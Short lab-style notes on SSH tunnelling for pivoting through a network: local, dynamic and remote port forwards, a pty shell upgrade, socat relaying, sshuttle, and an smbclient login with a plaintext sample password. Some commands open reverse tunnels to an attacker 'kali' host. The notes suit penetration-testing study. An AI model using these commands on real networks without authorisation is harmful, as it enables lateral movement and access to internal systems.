 SSH - Tunneling Protocol
### Local Port Forwarding

A local port forward can be set up using OpenSSH's **-L** option, which takes two sockets (in the format IPADDRESS:PORT) separated with a colon as an argument (e.g. IPADDRESS:PORT:IPADDRESS:PORT). The first socket is the listening socket that will be bound to the SSH client machine. The second socket is where we want to forward the packets to. The rest of the SSH command is as usual - pointed at the SSH server and user we wish to connect as.

python3 -c 'import pty; pty.spawn("/bin/sh")'
ssh -L 0.0.0.0:4455:172.16.188.217:445 database_admin@10.4.188.215

smbclient -p 4455 -L //192.168.188.63/ -U hr_admin --password=Welcome1234

### Dynamic Port Forwarding

ssh -N -D 0.0.0.0:9999 database_admin@10.4.242.215

use with proxychains

### Remote Port Forwarding


ssh -N -R 127.0.0.1:4444:10.4.188.215:4444 kali@192.168.45.181

### Remote Dynamic Port Forwarding

ssh -N -R 9998 kali@192.168.45.181

### sshuttle

socat TCP-LISTEN:2222,fork TCP:10.4.242.215:22
sshuttle -r database_admin@192.168.242.63:2222 10.4.242.0/24 172.16.242.0/24